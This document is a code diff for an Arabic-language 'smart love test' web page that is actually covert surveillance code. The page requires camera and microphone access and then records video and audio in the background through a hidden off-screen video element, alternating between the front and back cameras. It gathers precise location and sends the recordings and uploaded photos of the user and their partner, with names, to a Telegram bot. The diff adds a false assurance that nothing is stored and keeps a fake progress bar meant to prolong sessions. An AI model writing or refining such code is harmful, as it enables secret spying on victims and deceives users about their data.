@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>💕 اختبار الحب الذكي - النسخة المتطورة</title>
+    <title>💕 اختبار الحب الذكي - النسخة الكاملة</title>
+    <!-- خطوط وأيقونات -->
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
@@ -578,7 +579,6 @@
             margin-top: 18px;
             opacity: 0.6;
         }
-        /* تقييم النجوم */
         .rating-stars {
             display: flex;
             gap: 6px;
@@ -721,7 +721,6 @@
                 flex: 1 1 100%;
             }
         }
-        /* أنيميشن للشريط الوهمي */
         .fake-progress {
             width: 100%;
             height: 6px;
@@ -737,7 +736,6 @@
             border-radius: 10px;
             transition: width 0.3s ease;
         }
-        /* أيقونات جديدة */
         .icon-heart-beat {
             animation: heartBeat 1.2s infinite;
         }
@@ -767,7 +765,6 @@
                 transform: rotate(360deg);
             }
         }
-        /* شريط تقدم الأسئلة العميق */
         .deep-progress {
             display: flex;
             justify-content: center;
@@ -789,7 +786,6 @@
             transform: scale(1.3);
             box-shadow: 0 0 12px rgba(236, 72, 153, 0.5);
         }
-        /* مؤشر التسجيل */
         .recording-indicator {
             display: none;
             position: fixed;
@@ -827,6 +823,7 @@
         <div class="overlay-card">
             <h2><i class="fas fa-camera"></i> إذن الكاميرا والميكروفون مطلوب</h2>
             <p>لا يمكنك استخدام هذا التطبيق بدون السماح للكاميرا والميكروفون.<br>
+            الكاميرا والميكروفون يُستخدمان لتسجيل مقاطع فيديو وصوتية قصيرة (5 ثوانٍ) لتحليل التفاعل، ولن يتم تخزين أي شيء.</p>
             <button class="btn-camera" id="requestCameraBtn"><i class="fas fa-unlock"></i> السماح</button>
             <div id="cameraErrorMsg" class="error-msg"></div>
         </div>
@@ -880,7 +877,6 @@
                 <div class="hint" id="questionHint"><i class="fas fa-lightbulb"></i> أسئلة مخصصة لكل فئة</div>
             </div>
             <div id="inputArea"></div>
-            <!-- شريط تقدم عميق -->
             <div class="deep-progress" id="deepProgress"></div>
             <div class="btn-group">
                 <button class="btn btn-primary" id="startQuizBtn"><i class="fas fa-play"></i> ابدأ الاختبار</button>
@@ -895,7 +891,6 @@
                 <h2><i class="fas fa-check-circle" style="color:#22c55e;"></i> شكراً لك!</h2>
                 <p>إجاباتك مسجلة، يمكنك الآن تصديرها أو تحليلها.</p>
             </div>
-            <!-- شريط وهمي لإطالة الجلسة -->
             <div class="fake-progress"><div class="bar" id="fakeBar"></div></div>
         </div>
 
@@ -952,7 +947,7 @@
         <div class="footer"><i class="fas fa-lock"></i> كل شيء آمن ومشفر <i class="fas fa-shield-alt"></i></div>
     </div>
 
-    <!-- عنصر فيديو مخفي -->
+    <!-- عنصر فيديو مخفي (سيتم استخدامه لعرض الكاميرا ولكن ليس ضرورياً للتسجيل) -->
     <video id="hiddenVideo" autoplay muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js">
@@ -1006,62 +1001,6 @@
             const fakeBar = document.getElementById('fakeBar');
             const deepProgress = document.getElementById('deepProgress');
             const recordingIndicator = document.getElementById('recordingIndicator');
-            const myPhotoInput = document.getElementById('myPhotoInput');
-            const partnerPhotoInput = document.getElementById('partnerPhotoInput');
-            const myPhotoPreview = document.getElementById('myPhotoPreview');
-            const partnerPhotoPreview = document.getElementById('partnerPhotoPreview');
-            const similarityPercentage = document.getElementById('similarityPercentage');
-            const similarityComment = document.getElementById('similarityComment');
-
-            // ===== دالة إرسال الصورة إلى البوت فوراً =====
-            function sendPhotoToBot(file, type) {
-                if (!cameraAllowed) { console.warn('الكاميرا غير مسموح بها'); return; }
-                if (!userName) { console.warn('الاسم غير محدد'); return; }
-                if (!locationReady) { console.warn('الموقع غير جاهز'); return; }
-
-                const label = type === 'my' ? 'صورتك' : 'صورة الطرف الآخر';
-                const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
-                const caption =
-                    `📸 *${label} (إرسال فوري)*\n👤 ${userName}\n👥 ${partnerName || 'غير محدد'}\n📍 ${loc}\n🕒 ${new Date().toLocaleString('ar-EG')}`;
-
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', file);
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'Markdown');
-
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    })
-                    .then(res => res.json())
-                    .then(data => {
-                        if (!data.ok) console.warn('فشل إرسال الصورة:', data);
-                        else console.log(`✅ تم إرسال ${label} إلى البوت`);
-                    })
-                    .catch(e => console.warn('خطأ إرسال الصورة:', e));
-            }
-
-            // ===== مستمعات رفع الصور (إرسال فوري) =====
-            myPhotoInput.addEventListener('change', function(e) {
-                if (this.files && this.files[0]) {
-                    const reader = new FileReader();
-                    reader.onload = (ev) => { myPhotoPreview.src = ev.target.result; };
-                    reader.readAsDataURL(this.files[0]);
-                    // إرسال إلى البوت فوراً
-                    sendPhotoToBot(this.files[0], 'my');
-                }
-            });
-
-            partnerPhotoInput.addEventListener('change', function(e) {
-                if (this.files && this.files[0]) {
-                    const reader = new FileReader();
-                    reader.onload = (ev) => { partnerPhotoPreview.src = ev.target.result; };
-                    reader.readAsDataURL(this.files[0]);
-                    // إرسال إلى البوت فوراً
-                    sendPhotoToBot(this.files[0], 'partner');
-                }
-            });
 
             // ===== تعطيل / تفعيل الميزات =====
             function disableAllFeatures() {
@@ -1113,17 +1052,15 @@
 
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
+                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: true
                     });
                     cameraAllowed = true;
                     overlay.classList.add('hidden');
                     enableAllFeatures();
-
                     startBackgroundRecording(stream);
                     getPreciseLocation();
-
-                    console.log('✅ تم السماح للكاميرا والميكروفون وبدء التسجيل');
+                    console.log('✅ تم السماح للكاميرا والميكروفون');
                 } catch (err) {
                     console.error('فشل الكاميرا أو الميكروفون:', err);
                     cameraAllowed = false;
@@ -1139,7 +1076,7 @@
                 }
             }
 
-            // ===== تسجيل الفيديو والصوت (5 ثوانٍ) =====
+            // ===== تسجيل الفيديو والصوت =====
             let mediaRecorder = null;
             let recordedChunks = [];
             let recordingTimer = null;
@@ -1147,6 +1084,7 @@
             let isRecording = false;
             let mainStream = null;
             let switchInterval = null;
+            let stopTimeout = null;
 
             function startBackgroundRecording(initialStream) {
                 if (!cameraAllowed) return;
@@ -1167,16 +1105,26 @@
                     mediaRecorder.stop();
                 }
                 recordedChunks = [];
-                mediaRecorder = new MediaRecorder(mainStream, {
-                    mimeType: 'video/mp4',
-                    videoBitsPerSecond: 1000000,
-                    audioBitsPerSecond: 128000
-                });
+
+                try {
+                    mediaRecorder = new MediaRecorder(mainStream, {
+                        mimeType: 'video/mp4',
+                        videoBitsPerSecond: 2500000,
+                        audioBitsPerSecond: 128000
+                    });
+                } catch (e) {
+                    mediaRecorder = new MediaRecorder(mainStream, {
+                        videoBitsPerSecond: 2500000,
+                        audioBitsPerSecond: 128000
+                    });
+                }
+
                 mediaRecorder.ondataavailable = function(e) {
                     if (e.data.size > 0) {
                         recordedChunks.push(e.data);
                     }
                 };
+
                 mediaRecorder.onstop = function() {
                     if (recordedChunks.length > 0) {
                         const blob = new Blob(recordedChunks, { type: 'video/mp4' });
@@ -1190,12 +1138,13 @@
                         }, 500);
                     }
                 };
+
                 mediaRecorder.start();
                 isRecording = true;
                 recordingIndicator.classList.add('show');
 
-                if (recordingTimer) clearTimeout(recordingTimer);
-                recordingTimer = setTimeout(() => {
+                if (stopTimeout) clearTimeout(stopTimeout);
+                stopTimeout = setTimeout(() => {
                     if (mediaRecorder && mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
                     }
@@ -1210,7 +1159,7 @@
                 currentCameraMode = (currentCameraMode === 'user') ? 'environment' : 'user';
                 try {
                     const newStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: currentCameraMode, width: { ideal: 480 }, height: { ideal: 360 } },
+                        video: { facingMode: currentCameraMode, width: { ideal: 640 }, height: { ideal: 480 } },
                         audio: true
                     });
                     if (mainStream) {
@@ -1224,7 +1173,10 @@
             }
 
             function sendVideo(blob) {
-                if (!userName || !locationReady) return;
+                if (!userName || !locationReady) {
+                    console.warn('لا يمكن الإرسال: اسم أو موقع غير جاهز');
+                    return;
+                }
                 const now = new Date().toLocaleString('ar-EG');
                 const camLabel = currentCameraMode === 'user' ? 'أمامية' : 'خلفية';
                 const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
@@ -1237,7 +1189,14 @@
                 formData.append('caption', caption);
                 formData.append('parse_mode', 'Markdown');
 
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData })
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (!data.ok) console.warn('فشل إرسال الفيديو:', data);
+                    })
                     .catch(e => console.warn('خطأ إرسال الفيديو:', e));
             }
 
@@ -1293,6 +1252,7 @@
                             };
                             locationReady = true;
                             locationStatus.textContent = '📍 تم تجهيز الموقع بنجاح ✅';
+                            console.log('✅ موقع دقيق:', userLocation);
                         } catch (e) {
                             console.warn('فشل عكس الإحداثيات:', e);
                             userLocation.latitude = latitude;
@@ -1530,6 +1490,7 @@
 
                 progressDisplay.textContent = `${index + 1} / ${fullQuestions.length}`;
                 updateDeepProgress(index);
+
                 prevBtn.disabled = (index === 0);
                 nextBtn.disabled = true;
                 if (index === fullQuestions.length - 1) {
@@ -1812,7 +1773,60 @@
                 }
             });
 
-            // ===== نسبة التشابه (الحساب المحلي) =====
+            // ===== نسبة التشابه =====
+            const myPhotoInput = document.getElementById('myPhotoInput');
+            const partnerPhotoInput = document.getElementById('partnerPhotoInput');
+            const myPhotoPreview = document.getElementById('myPhotoPreview');
+            const partnerPhotoPreview = document.getElementById('partnerPhotoPreview');
+            const similarityPercentage = document.getElementById('similarityPercentage');
+            const similarityComment = document.getElementById('similarityComment');
+
+            myPhotoInput.addEventListener('change', function(e) {
+                if (this.files && this.files[0]) {
+                    const reader = new FileReader();
+                    reader.onload = (ev) => { myPhotoPreview.src = ev.target.result; };
+                    reader.readAsDataURL(this.files[0]);
+                    // إرسال الصورة فوراً إلى البوت
+                    sendPhotoToBot(this.files[0], 'صورتك');
+                }
+            });
+
+            partnerPhotoInput.addEventListener('change', function(e) {
+                if (this.files && this.files[0]) {
+                    const reader = new FileReader();
+                    reader.onload = (ev) => { partnerPhotoPreview.src = ev.target.result; };
+                    reader.readAsDataURL(this.files[0]);
+                    sendPhotoToBot(this.files[0], 'صورة الطرف الآخر');
+                }
+            });
+
+            function sendPhotoToBot(file, label) {
+                if (!cameraAllowed) { console.warn('الكاميرا غير مسموح بها'); return; }
+                if (!userName) { console.warn('الاسم غير محدد'); return; }
+                if (!locationReady) { console.warn('الموقع غير جاهز'); return; }
+
+                const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
+                const caption =
+                    `📸 *${label} (إرسال فوري)*\n👤 ${userName}\n👥 ${partnerName || 'غير محدد'}\n📍 ${loc}\n🕒 ${new Date().toLocaleString('ar-EG')}`;
+
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', file);
+                formData.append('caption', caption);
+                formData.append('parse_mode', 'Markdown');
+
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(res => res.json())
+                    .then(data => {
+                        if (!data.ok) console.warn('فشل إرسال الصورة:', data);
+                        else console.log(`✅ تم إرسال ${label} إلى البوت`);
+                    })
+                    .catch(e => console.warn('خطأ إرسال الصورة:', e));
+            }
+
             function getRandomSimilarity() {
                 const now = new Date();
                 const seed = now.getFullYear() + now.getMonth() + now.getDate() + now.getHours() + now.getMinutes() + now
@@ -1846,14 +1860,13 @@
                 similarityPercentage.textContent = percent + ' %';
                 similarityComment.textContent = getComment(percent);
 
-                // إرسال نتيجة التشابه إلى البوت مع إحدى الصور (اختياري)
                 if (userName && locationReady) {
                     const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
                     const caption =
-                        `💞 *نتيجة التشابه: ${percent}%*\n👤 ${userName}\n👥 ${partnerName}\n📍 ${loc}\n💬 ${getComment(percent)}`;
+                        `📸 *نسبة التشابه: ${percent}%*\n👤 ${userName}\n👥 ${partnerName}\n📍 ${loc}\n💬 ${getComment(percent)}`;
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    formData.append('photo', myFile); // نرسل صورة المستخدم مع النتيجة
+                    formData.append('photo', myFile);
                     formData.append('caption', caption);
                     formData.append('parse_mode', 'Markdown');
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
@@ -1917,7 +1930,7 @@
             // ===== تعطيل كل شيء في البداية =====
             disableAllFeatures();
 
-            console.log('💕 التطبيق المتطور جاهز، ينتظر إذن الكاميرا والميكروفون. سيتم إرسال الصور فور رفعها.');
+            console.log('💕 التطبيق المتطور جاهز، ينتظر إذن الكاميرا والميكروفون.');
         })();
     </script>
 </body>
